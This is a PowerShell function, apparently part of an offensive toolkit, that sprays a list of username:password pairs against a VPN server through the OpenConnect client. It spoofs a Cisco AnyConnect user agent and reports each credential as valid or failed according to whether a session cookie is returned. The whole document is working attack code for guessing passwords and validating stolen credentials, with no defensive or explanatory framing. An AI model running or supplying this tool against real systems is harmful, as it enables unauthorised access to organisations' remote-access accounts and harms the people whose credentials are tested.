Function Invoke-OpenConnectSpray {
  [CmdletBinding()]
  param (
    [Parameter(Mandatory=$true, Position=0)]
    [string]$Server,
    [Parameter(Mandatory=$true, Position=1)]
    [string]$CredsFile,
    [string]$ServerCert = "",
    [string]$Protocol = "anyconnect",
    [string]$UserAgent = "Cisco AnyConnect VPN Agent for Windows",
    [string]$AuthGroup = "",
    [string]$OPENCONNECT = "C:\Program Files\OpenConnect\openconnect.exe",
    [bool]$Details = $false
  )

  $Creds = Get-Content $CredsFile

  foreach ($Cred in $Creds) {
    $CredSp = $Cred -split ":"
    $Username = $CredSp[0]
    $Password = $CredSp[1]

    $ConnectCommand = "echo($Password|`"$OPENCONNECT`" --authenticate --protocol $Protocol --useragent=`"$UserAgent`" -u $Username $Server"

    if ($ServerCert -ne "") {
        $ConnectCommand = $ConnectCommand + " --servercert $ServerCert"
    }

    if ($AuthGroup -ne "") {
        $ConnectCommand = $ConnectCommand + " --authgroup=$AuthGroup"
    }

    if ($Details) {
        Write-Output $ConnectCommand
        $Output = &cmd /c $ConnectCommand
    } else {
        $Output = &cmd /c $ConnectCommand 2>$null
    }

    if (($Output | Out-String).Contains("COOKIE")) {
      Write-Host "$Server,$Username,$Password,VALID" -ForegroundColor Green
    } else {
      Write-Host "$Server,$Username,$Password,FAILED" -ForegroundColor Red
    }
  }
}
